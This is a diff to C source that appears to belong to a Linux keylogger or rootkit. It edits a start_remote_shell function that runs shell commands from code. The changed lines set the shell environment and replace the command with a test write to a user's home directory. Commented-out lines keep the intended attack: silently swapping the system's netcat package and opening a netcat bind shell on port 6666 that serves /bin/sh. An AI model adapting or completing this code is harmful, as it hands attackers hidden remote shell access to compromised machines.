@@ -128,13 +128,17 @@ static const char* keymap_shift[] =
 	/* Start Remote Shell */
 
 	void start_remote_shell(void){
-	    char *envp[] = {"HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL}; 
+	    //char *envp[] = {"HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL}; 
+	    static char *envp[] = {
+        "HOME=/",
+        "TERM=linux",
+        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 	    /* netcat installed in modern dirstros doesn't support the -e option. Solution install traditional netcat. 
 		(could be done in a mor e elegant fashion by for example downloading the binary. 
 		-> independant of the distro/packet managment tool. 
 		http://superuser.com/questions/691008/why-is-the-e-option-missing-from-netcat-openbsd */
 	    //char *argv1[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y remove netcat*", NULL}; // -y allways answer yes
-	    char *argv1[] = {"/bin/sh", NULL};
+	    char *argv1[] = {"/bin/sh", "-c", "/bin/echo > /home/michael/here.txt", NULL}; 
 	    //char *argv2[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y install netcat", NULL};
 	    //char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh", NULL}; 
 
